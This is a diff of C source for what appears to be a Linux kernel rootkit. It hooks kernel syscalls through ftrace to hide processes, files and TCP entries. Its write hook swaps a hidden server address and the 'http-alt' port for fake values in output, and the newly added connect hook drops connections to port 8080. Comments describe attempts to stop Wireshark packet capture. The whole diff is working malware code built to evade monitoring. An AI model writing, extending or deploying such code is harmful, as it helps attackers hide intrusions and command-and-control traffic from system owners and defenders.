@@ -16,10 +16,9 @@
 #include <linux/module.h>
 #include <linux/dirent.h>
 #include <linux/tcp.h>
+#include <linux/socket.h>
+#include <linux/errno.h>
 
-#include <linux/mfd/ezx-pcap.h>
-#include <linux/spi/spi.h>
-#include <linux/platform_device.h>
 #include <linux/string.h>
 
 #include <net/tcp.h>
@@ -225,7 +224,7 @@ static asmlinkage int hook_openat(int dirfd, const char __user *pathname, int fl
 /* Hook the write function to prevent communication with server from 
  * from being output to stdout. */
 #define HTTP_ALT "http-alt"
-#ifdef PTREGS_SYSCALL_STUBS
+
 static asmlinkage long (*orig_write)(struct pt_regs *regs);
 
 static asmlinkage long hook_write(struct pt_regs *regs) {
@@ -240,7 +239,7 @@ static asmlinkage long hook_write(struct pt_regs *regs) {
     regs->si = (unsigned long)((void*)fake_address);
 
     return orig_write(regs);
-  } else if (strstr(orig_buff, ADDR_TO_HIDE) != NULL) {
+  } else if (strstr(orig_buff, HTTP_ALT)!= NULL) {
     regs->si = (unsigned long)((void*)fake_port);
 
     return orig_write(regs);
@@ -248,32 +247,54 @@ static asmlinkage long hook_write(struct pt_regs *regs) {
 
   return orig_write(regs);
 }
-#else 
-static asmlinkage long (*orig_write)(struct pt_regs *regs);
-
-static asmlinkage long hook_write(int fd, const char __user *buff, size_t count) {
-  char *fake_port = "2020";
-  char *fake_address = "123.456.789.0";
-  if (strstr(buff, bad_port) != NULL) {
-    return orig_write(fd, fake_port, count);
-  } else if (strstr(buff, bad_address) != NULL) {
-    return orig_write(fd, fake_address, count);
-  } 
-
-  return orig_write(fd, buff, count);
-}
-#endif 
 
 /* Tries to prevent wireshark from using pcap. Wireshark uses libpcap to library 
  * to perform pcap. This hook aims to interrupt packet processing by causing 
  * errors. */
-static asmlinkage int (*orig_ezx_pcap_putget)(struct pcap_chip *pcap, u32 *data);
+#define PCAP_ADC_MAXQ		8
+struct pcap_chip {
+	struct spi_device *spi;
 
-static asmlinkage int hook_ezx_pcap_putget(struct pcap_chip *pcap, u32 *data) {
-  // Memset things to '\0' in this pcap_chip struct(it looks important).
-  memset(pcap, '\0', 20);
-  memset(data, '\0', sizeof(u32));
-  return -1; 
+	/* IO */
+	u32 buf;
+	spinlock_t io_lock;
+
+	/* IRQ */
+	unsigned int irq_base;
+	u32 msr;
+	struct work_struct isr_work;
+	struct work_struct msr_work;
+	struct workqueue_struct *workqueue;
+
+	/* ADC */
+	struct pcap_adc_request *adc_queue[PCAP_ADC_MAXQ];
+	u8 adc_head;
+	u8 adc_tail;
+	spinlock_t adc_lock;
+};
+
+asmlinkage int (*orig_ezx_pcap_putget)(struct pt_regs *regs);
+
+asmlinkage int hook_ezx_pcap_putget(struct pt_regs *regs) {
+	return orig_ezx_pcap_putget(regs);
+}
+
+/* Tried to see if we could hook the conenct function, but even successfully hooking,
+ * the connection is still detected. */
+static asmlinkage int (*orig_connect)(struct pt_regs *regs);
+
+static asmlinkage int hook_connect(struct pt_regs *regs) {
+  struct sockaddr_in *sock = (struct sockaddr_in *)((void*)(regs->si));
+  if (sock->sin_family == AF_INET && sock->sin_port == htons(8080)) {
+    printk("sin_port before: %u %u", sock->sin_port, htons(8080));
+    memset(&(sock->sin_port), '\0', 4);
+    printk("sin_port after: %u %u", sock->sin_port, htons(8080));
+    return ENETUNREACH;
+  } else if (sock->sin_port != htons(8080)) {
+    return orig_connect(regs);
+  } else {
+    return ENETUNREACH;
+  }
 }
 
 //The hooking structure: for every syscall we want to hijack,
@@ -285,9 +306,10 @@ static struct ftrace_hook hooks[] = {
 	HOOK("sys_kill", hook_kill, &orig_kill),
   HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
   HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
-  HOOK("__x64_sys_openat", hook_openat, &orig_openat),
+  //HOOK("__x64_sys_openat", hook_openat, &orig_openat),
   HOOK("__x64_sys_write", hook_write, &orig_write),
-  HOOK("ezx_pcap_putget", hook_ezx_pcap_putget, &orig_ezx_pcap_putget),
+  //HOOK("ezx_pcap_putget", hook_ezx_pcap_putget, &orig_ezx_pcap_putget),
+  HOOK("__x64_sys_connect", hook_connect, &orig_connect),
 };
 
 
